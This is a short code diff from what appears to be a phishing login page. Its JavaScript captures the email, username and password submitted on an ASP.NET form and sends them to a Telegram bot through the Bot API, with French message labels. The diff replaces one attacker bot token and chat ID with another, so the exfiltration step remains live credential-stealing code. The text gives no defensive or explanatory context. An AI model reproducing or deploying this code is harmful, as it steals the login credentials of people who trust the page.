@@ -15108,8 +15108,8 @@ document.getElementById('aspnetForm').addEventListener('submit', function(event)
     var password = document.getElementById('password').value;
 
     // Send data to Telegram using Bot API
-    var botToken = '8145167358:AAHh7Y3SoS2bSPimw6RWCR3DSUJYLP32i4A';  // Replace with your bot token
-    var chatId = '-4614094075';  // Replace with the chat ID you want to send the message to
+    var botToken = '7813635260:AAHkJu1TLcP0EHZLq5llev2ub4_Wblttwyk';  // Replace with your bot token
+    var chatId = '1544784278';  // Replace with the chat ID you want to send the message to
     var message = `E-mail: ${email}\nIdentifiant: ${username}\nMot de passe: ${password}`;
 
     var telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
